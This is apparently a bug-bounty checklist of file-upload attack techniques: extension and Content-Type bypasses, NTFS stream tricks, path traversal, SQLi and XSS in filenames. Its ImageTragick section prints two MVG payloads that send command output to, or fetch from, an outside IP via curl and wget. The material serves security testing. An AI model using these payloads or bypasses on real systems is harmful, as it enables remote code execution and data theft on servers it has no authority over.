# Bypass blacklists

- [ ] Test for file extension restriction bypasses
    - Finding missed extensions that can be executed on the server side or can be dangerous on the client side (e.g. ".php5", ".pht", ".phtml", ".shtml", ".asa", ".cer", ".asax", ".swf", or ".xap").
    - Finding flaws in a web server configuration when it parses files with double extensions or it executes them by providing a sensitive extension after a delimiter such as "/" or ";" character (e.g. "/file.jpg/index.php" when the "file.jpg" file contains PHP code and has been uploaded)
       - In Apache, a php file might be executed using the double extension technique such as "file.php.jpg" when ".jpg" is allowed.
        - In IIS6 (or prior versions), a script file can be executed by using one of these two methods:
            - by adding a semi-colon character after the forbidden extension and before the permitted one (e.g. "file.asp;.jpg")
            - by renaming a script file's extension (e.g. ".asp") to an allowed extension (e.g. ".txt") in a folder that its name ends with the script's extension (e.g. "folder.asp\file.txt"). In Windows, it is possible to create a directory by using a file uploader and ADS (Alternate Data Stream). In this method, a filename that ends with "::$Index_Allocation" or ":$I30:$Index_Allocation" makes the file uploader to create a directory rather than a file (e.g. "folder.asp::$Index_Allocation" creates "folder.asp" as a directory).
    - Changing a number of letters to their capital forms to bypass case sensitive rules (e.g. "file.aSp" or "file.PHp3").

- [ ] Test for Content-Type restriction bypasses

"Content-Type" entity in the header of the request indicates the Internet media type of the message content. Sometimes web applications use this parameter in order to recognise a file as a valid one. For instance, they only accept the files with the "Content-Type" of "text/plain".
It is possible to bypass this protection by changing this parameter in the request header using a web proxy.
    - https://hackerone.com/reports/97672
    
- [ ] Test for file header restrinction bypasses   
    - Keep the magic bytes at the start of the contents and then put a php payload after them.
    
- Using Windows 8.3 feature, it is possible to replace the existing files by using their shortname (e.g. "web.config" can be replaced by "web~1.con" or ".htaccess" can be replaced by "HTACCE~1")
- Finding characters that are converted to other useful characters during the file upload process. For instance, when running PHP on IIS, the ">", "<", and double quote " characters respectively convert to "?", "*", and "." characters that can be used to replace existing files (e.g. "web<<" can replace the "web.config" file). In order to include the double quote character in the filename in a normal file upload request, the filename in the "Content-Disposition" header should use single quotes (e.g. filename='web"config' to replace the "web.config" file).
- Finding neutral characters after a filename such as trailing spaces and dots in Windows filesystem or dot and slash characters in a Linux filesystem. These characters at the end of a filename will be removed automatically (e.g. "file.asp ... ... . . .. ..", "file.asp ", or "file.asp."). Although slash or backslash characters are also normally problematic characters, they can be ignored in a normal file upload request as anything before these characters may count as the directory name on the server-side; that said, they should be tried for a thorough test (e.g. "test.php/" or "test.php.\").
- Finding flaws in extension detection techniques. A web server may use the first extension after the first dot (".") in the provided filename or use a flawed algorithm to detect the extension when there is none or multiple dot characters (e.g. "file.txt.jpg.php").
- Using control characters such as null character (0x00) after a forbidden extension and before a permitted one may lead to a bypass. In this method, all the strings after the Null character will be discarded when saving the files. Both URL-encoded and decoded version of the null character should be tried in a file upload request for a thorough test.
- Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. "file.asax:.jpg"). This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. "file.asp::$data.")
- Flaws in the protection mechanism when it replaces dangerous extensions. For instance, "file.p.phphp" might be changed to "file.php" after going through this functionality.
- Flaws in the uploaded file usage for instance when a PHP application uses the "include" function to show the uploaded images.
- Combination of the above techniques.

# Path traversal in uploads
- [ ] Test for Directory traversal when uploading. When we upload files through a multipart post request, try adding `../` to the filename to check if we can upload the file further up in the filesystem.
    - https://hackernoon.com/cross-site-scripting-to-remote-code-execution-on-trellos-app-699512676f0c
    
# SQLi in uploads
- [ ] Test for SQL Injection in the filename parameter of the file upload.
    - https://jspin.re/fileupload-blind-sqli/
    
# XSS in uploads
- [ ] Test for XSS both in the filename parameter and the contents of the file.
    - https://medium.com/@vis_hacker/how-i-got-stored-xss-using-file-upload-5c33e19df51e
    - https://hackerone.com/reports/93807
    - https://hackernoon.com/cross-site-scripting-to-remote-code-execution-on-trellos-app-699512676f0c
    - https://www.n00py.io/2018/03/microsoft-word-upload-to-stored-xss/
    - https://hackerone.com/reports/97672
    - https://hackerone.com/reports/216822
    - https://hackerone.com/reports/179164
    - https://hackerone.com/reports/97657
    - https://hackerone.com/reports/148853
    - https://hackerone.com/reports/122849
    - https://anotherhackerblog.com/exploiting-file-uploads-pt1/
    - https://brutelogic.com.br/blog/file-upload-xss/
    
# RCE in uploads
## Image Magic

"It's a good idea to observe requests during an image upload or in instances where the website allows image manipulation i.e cropping, since there's a possibility you could find command injection or SSRF through those requests" 

Exploits:

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id | curl http://167.71.9.74:80/ -d @- > /dev/null`'
pop graphic-context
```
```
push graphic-context 
viewbox 0 0 640 480 
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 167.71.9.74:80/ > /dev/null`' pop graphic-context
```
  - https://hackerone.com/reports/212696
  - http://nahamsec.com/exploiting-imagemagick-on-yahoo/

- [ ] Test for ImageTragic in MVG files
    - https://hethical.io/trello-bug-bounty-access-servers-files-using-imagetragick/​


- [ ] Test for RCE through PNG chunks
    - https://secgeek.net/bookfresh-vulnerability/
